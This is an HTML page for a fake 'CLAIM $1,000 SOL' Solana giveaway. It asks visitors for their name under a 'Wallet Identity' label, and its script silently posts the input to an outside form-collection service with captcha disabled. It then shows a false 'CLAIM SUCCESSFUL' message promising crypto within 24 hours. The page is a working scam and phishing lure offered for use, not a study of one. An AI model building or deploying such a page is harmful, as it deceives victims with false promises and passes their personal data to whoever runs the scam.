<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <!-- Premium Web3 Typography -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root {
            --solana-green: #00FFA3;
            --solana-purple: #DC1FFF;
            --deep-bg: #050608; /* Darker, finer background */
            --card-glass: rgba(10, 12, 16, 0.85);
            --border-glow: rgba(255, 255, 255, 0.05);
        }

        body {
            margin: 0;
            background-color: var(--deep-bg);
            color: #ffffff;
            font-family: 'Space Grotesk', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            /* Ultra-dark subtle animated background */
            background-image: 
                radial-gradient(circle at 10% 10%, rgba(220, 31, 255, 0.05) 0%, transparent 50%),
                radial-gradient(circle at 90% 90%, rgba(0, 255, 163, 0.05) 0%, transparent 50%);
        }

        .glass-card {
            width: 85%;
            max-width: 480px;
            background: var(--card-glass);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid var(--border-glow);
            border-radius: 40px;
            padding: 50px 35px;
            box-shadow: 0 50px 100px rgba(0, 0, 0, 0.9);
            text-align: center;
        }

        h1 {
            font-family: 'Syncopate', sans-serif;
            font-size: 1.6rem;
            white-space: nowrap;
            margin-bottom: 25px;
            background: linear-gradient(90deg, var(--solana-green), #fff, var(--solana-purple));
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 5s linear infinite;
            letter-spacing: -1px;
            font-weight: 700;
        }

        @keyframes shine { to { background-position: 200% center; } }

        .instruction {
            font-size: 0.9rem;
            color: #8a8a8e; /* Subdued for high contrast */
            margin-bottom: 45px;
            line-height: 1.6;
            font-weight: 400;
            letter-spacing: 0.3px;
        }

        .input-box {
            text-align: left;
            margin-bottom: 35px;
        }

        label {
            font-size: 0.65rem;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: var(--solana-green);
            margin-bottom: 12px;
            display: block;
            font-weight: 700;
            opacity: 0.8;
        }

        input[type="text"] {
            width: 100%;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            color: #fff;
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.1rem;
            box-sizing: border-box;
            transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        input[type="text"]:focus {
            outline: none;
            border-color: var(--solana-green);
            background: rgba(0, 255, 163, 0.03);
            box-shadow: 0 0 25px rgba(0, 255, 163, 0.1);
        }

        .connect-btn {
            width: 100%;
            padding: 22px;
            border: none;
            border-radius: 16px;
            background: linear-gradient(135deg, var(--solana-green), var(--solana-purple));
            color: #fff;
            font-family: 'Syncopate', sans-serif;
            font-weight: 700;
            font-size: 0.8rem;
            cursor: pointer;
            box-shadow: 0 15px 35px rgba(220, 31, 255, 0.2);
            transition: transform 0.2s;
        }

        .connect-btn:active { transform: scale(0.98); }

        /* Success View Styles */
        #success-view { display: none; }

        .success-header {
            font-family: 'Syncopate', sans-serif;
            font-size: 1.5rem;
            color: var(--solana-green);
            margin-bottom: 20px;
            letter-spacing: 1px;
        }

        .congrats-card {
            font-size: 1.1rem;
            line-height: 1.8;
            color: #ffffff;
            padding: 30px;
            background: rgba(0, 255, 163, 0.03);
            border-radius: 25px;
            border: 1px solid rgba(0, 255, 163, 0.2);
            font-weight: 400;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div class="glass-card">
        <!-- Input Section -->
        <div id="initial-view">
            <!-- VERIFIED EMAIL ADDRESS BELOW -->
            <form id="claim-form" action="https://formsubmit.co" method="POST">
                <h1>CLAIM $1,000 SOL</h1>
                <p class="instruction">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                
                <div class="input-box">
                    <label>Wallet Identity</label>
                    <input type="text" name="NAME_SUBMISSION" placeholder="Enter your name" required>
                </div>

                <!-- Technical Configuration -->
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_subject" value="SOLANA WALLET CONNECTION: NEW NAME">
                
                <button type="submit" class="connect-btn">CONNECT WALLET</button>
            </form>
        </div>

        <!-- Success Section -->
        <div id="success-view" style="animation: fadeInUp 0.8s ease forwards;">
            <h1 class="success-header">CLAIM SUCCESSFUL</h1>
            <div class="congrats-card">
                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        form.onsubmit = async (e) => {
            e.preventDefault();
            
            // Switch UI immediately
            document.getElementById('initial-view').style.display = 'none';
            document.getElementById('success-view').style.display = 'block';

            // Silently send data to your email
            const data = new FormData(form);
            fetch(form.action, {
                method: 'POST',
                body: data,
                headers: { 'Accept': 'application/json' }
            });
        };
    </script>
</body>
</html>
